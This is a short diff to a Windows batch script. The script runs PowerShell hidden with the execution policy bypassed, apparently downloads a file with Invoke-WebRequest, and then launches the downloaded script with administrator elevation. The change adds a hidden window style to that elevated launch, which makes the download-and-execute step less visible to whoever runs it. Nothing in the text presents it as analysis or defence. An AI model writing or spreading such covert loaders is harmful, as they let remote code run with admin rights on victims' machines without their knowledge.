@@ -8,6 +8,6 @@ powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -command "Invoke-WebR
 
 set "PowerShellScriptPath=%~dp0%DownloadFilePath%"
 
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs"
+PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs"
 
 endlocal
